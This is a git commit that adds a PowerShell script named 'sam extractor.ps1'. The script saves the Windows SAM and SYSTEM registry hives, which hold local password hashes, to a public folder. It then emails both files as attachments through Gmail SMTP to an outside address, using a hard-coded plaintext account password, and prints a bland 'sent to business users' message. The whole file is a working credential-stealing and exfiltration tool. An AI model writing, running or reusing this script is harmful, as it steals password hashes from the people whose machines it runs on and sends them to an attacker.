b33e8f6ee2fadf013e69422cc908b442e74eb6a2
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-04-20 22:07:08 -0400

    Add files via upload

---
+++ sam extractor.ps1
@@ -0,0 +1,26 @@
+﻿reg save hklm\sam C:\Users\Public\sam
+reg save hklm\system C:\Users\Public\system
+
+$Body = "Sample Email Body"  
+$SmtpServer = 'smtp.gmail.com'  
+$SmtpUser = 'rogermoor283@gmail.com'  
+$smtpPassword = '822247581'  
+$MailtTo = 'joelhutchinson407@gmail.com'  
+$MailFrom = 'rogermoor283@gmail.com'  
+$MailSubject = "Testing Mail Attachments using $SmtpServer"  
+$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |  
+ConvertTo-SecureString -AsPlainText -Force)  
+Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body "$Body" -Attachments "C:\Users\Public\sam" -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  
+write-Output "Custom Message : Attachment Email Sent to Business Users"
+
+$Body = "Sample Email Body"  
+$SmtpServer = 'smtp.gmail.com'  
+$SmtpUser = 'rogermoor283@gmail.com'  
+$smtpPassword = '822247581'  
+$MailtTo = 'joelhutchinson407@gmail.com'  
+$MailFrom = 'rogermoor283@gmail.com'  
+$MailSubject = "Testing Mail Attachments using $SmtpServer"  
+$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |  
+ConvertTo-SecureString -AsPlainText -Force)  
+Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body "$Body" -Attachments "C:\Users\Public\system" -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  
+write-Output "Custom Message : Attachment Email Sent to Business Users"
